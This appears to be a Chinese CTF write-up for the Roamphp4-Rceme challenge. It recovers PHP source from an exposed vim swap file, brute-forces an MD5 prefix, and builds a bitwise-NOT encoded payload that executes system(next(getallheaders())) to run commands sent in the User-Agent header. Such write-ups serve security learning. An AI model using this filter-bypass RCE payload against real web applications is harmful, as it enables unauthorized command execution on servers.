        <content type="html"><![CDATA[<h1 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="[极客大挑战 2020]Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png" alt="img"></p><p>进入题目，可以看到，大概意思就是如果code的md5值前5位是3e16b，那么就会执行命令</p><p>这边给出一个md5生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&#x27;0e788&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>查看源码，发现提示</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png" alt="img"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vim swp，.swp文件是vim使用不当而生成的一个文件，这种文件一般都是“坏的”，查看原来内容需要vim -r</span><br><span class="line">要直接用 Vim 打开一个 .swp 文件，你可以采取以下步骤。一般情况下，.swp 文件是二进制文件，直接编辑它并不常见，但你可能会希望查看其内容。</span><br><span class="line"></span><br><span class="line">1. 打开 .swp 文件</span><br><span class="line">你可以用 vim 命令直接打开 .swp 文件。例如：</span><br><span class="line">vim example.txt.swp</span><br><span class="line"></span><br><span class="line">2. 使用 :recover 命令恢复文件</span><br><span class="line">如果你的目的是从交换文件中恢复数据，可以使用 :recover 命令。假设你有一个交换文件 example.txt.swp，你可以这样做：</span><br><span class="line">vim -r example.txt</span><br><span class="line"></span><br><span class="line">3. 手动打开 .swp 文件查看内容</span><br><span class="line">如果你只想查看 .swp 文件的内容，尽管它是二进制文件，你可以使用 Vim 的二进制模式来查看。注意，这不是常见操作，而且通常不会有很好的阅读体验，但可以帮助你检查交换文件的一些细节。步骤如下：</span><br><span class="line">vim -b example.txt.swp</span><br><span class="line"></span><br><span class="line">在 Vim 中，使用以下命令可以切换到十六进制模式，这样你可以更方便地查看二进制内容：</span><br><span class="line">:%!xxd</span><br><span class="line"></span><br><span class="line">要返回普通模式，可以使用：</span><br><span class="line">:%!xxd -r</span><br><span class="line"></span><br><span class="line">4. 使用 xxd 查看 .swp 文件</span><br><span class="line">你也可以使用 xxd 命令来查看 .swp 文件的内容：</span><br><span class="line">xxd example.txt.swp | less</span><br><span class="line">这会将 .swp 文件转换为十六进制显示，便于查看。</span><br><span class="line"></span><br><span class="line">5. 确定如何处理 .swp 文件</span><br><span class="line">大多数情况下，你需要根据 Vim 的提示来决定如何处理 .swp 文件。例如，当你尝试打开一个文件时，Vim 会提示交换文件已经存在，并给出几种处理选项：</span><br><span class="line"></span><br><span class="line">O: 只读打开文件。</span><br><span class="line">E: 继续编辑文件，忽略交换文件。</span><br><span class="line">R: 恢复文件，尝试从交换文件中恢复数据。</span><br><span class="line">D: 删除交换文件，通常在确认没有其他 Vim 实例在编辑该文件时使用。</span><br><span class="line">Q: 退出，不进行任何操作。</span><br><span class="line">A: 中止操作，类似于退出。</span><br><span class="line">选择适当的选项，处理交换文件后再继续编辑主文件。</span><br><span class="line"></span><br><span class="line">通过这些方法，你可以用 Vim 打开和查看 .swp 文件。要特别注意的是，.swp 文件主要用于 Vim 的数据恢复，所以一般不建议直接编辑它们，而是通过恢复和处理的方式进行操作。</span><br></pre></td></tr></table></figure><p>然后，我们直接访问&#x2F;.index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png" alt="img"></p><p>在kali中打开 vim -r index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png" alt="img"></p><p>源码如上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(mt_rand() . sha1(mt_rand())), 0, 5) 是一段 PHP 代码，用于生成一个长度为 5 的随机字符串。下面是这段代码的具体解析：</span><br><span class="line"></span><br><span class="line">mt_rand():</span><br><span class="line"></span><br><span class="line">mt_rand() 是一个生成随机整数的函数，基于 Mersenne Twister 算法，比 rand() 更快并且提供更高的随机性。</span><br><span class="line">该函数会返回一个介于 0 和 RAND_MAX 之间的随机整数。</span><br><span class="line">sha1(mt_rand()):</span><br><span class="line"></span><br><span class="line">生成一个随机整数，然后计算其 SHA-1 哈希值。</span><br><span class="line">SHA-1 哈希值是一个 40 字符的十六进制字符串。</span><br><span class="line">连接随机值和 SHA-1 哈希值:</span><br><span class="line"></span><br><span class="line">mt_rand() . sha1(mt_rand()) 生成两个随机整数，并将它们的值连接起来。</span><br><span class="line">md5():</span><br><span class="line"></span><br><span class="line">对连接后的字符串计算其 MD5 哈希值。</span><br><span class="line">MD5 哈希值是一个 32 字符的十六进制字符串。</span><br><span class="line">substr():</span><br><span class="line"></span><br><span class="line">从生成的 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">组合起来，代码的具体执行顺序如下：</span><br><span class="line"></span><br><span class="line">调用 mt_rand() 生成一个随机整数。</span><br><span class="line">调用 sha1() 生成另一个随机整数的 SHA-1 哈希值。</span><br><span class="line">将这两个值连接起来形成一个字符串。</span><br><span class="line">计算这个字符串的 MD5 哈希值。</span><br><span class="line">从 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">因此，代码的作用是生成一个相对随机的 5 字符长的字符串</span><br></pre></td></tr></table></figure><p>可以看到进行了长度限制和过滤，并且那个md5值也在变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">前置知识：</span><br><span class="line"></span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>][<span class="number">0</span>]()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>]&#123;<span class="number">0</span>&#125;()</span><br><span class="line">效果作用是一样的。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(): [~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>][~%CF]();</span><br><span class="line">加这个[~%FF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() 获取所有 HTTP 头信息，返回一个关联数组。</span><br><span class="line"><span class="title function_ invoke__">next</span>() 试图将数组的内部指针移动到下一个元素，并返回该元素的值。</span><br><span class="line"></span><br><span class="line">假设 HTTP 头包含以下信息：</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [Host] =&gt; example.com</span><br><span class="line">    [User-Agent] =&gt; Mozilla/<span class="number">5.0</span></span><br><span class="line">    [Accept] =&gt; text/html</span><br><span class="line">    [Connection] =&gt; keep-alive</span><br><span class="line">)</span><br><span class="line">当你执行 <span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()) 时：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>(); <span class="comment">// 获取所有 HTTP 头信息</span></span><br><span class="line"><span class="variable">$nextHeader</span> = <span class="title function_ invoke__">next</span>(<span class="variable">$headers</span>); <span class="comment">// 将指针移动到下一个元素，并返回该元素的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nextHeader</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在这个示例中，<span class="variable">$nextHeader</span> 将包含 Mozilla/<span class="number">5.0</span>，因为这是数组中的第二个元素。</span><br></pre></td></tr></table></figure><p>因为UA是可控的，所以一般在UA进行RCE</p><p>然后，我们抓包看一下</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png" alt="img"></p><p>在第二位，所以构造语句拿到http头，并且执行在UA中的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即：<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure><p>然后，进行取反绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png" alt="img"></p><p>查看效果</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png" alt="img"></p><p>然后，直接cat &#x2F;flll1114gggggg</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png" alt="img"></p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
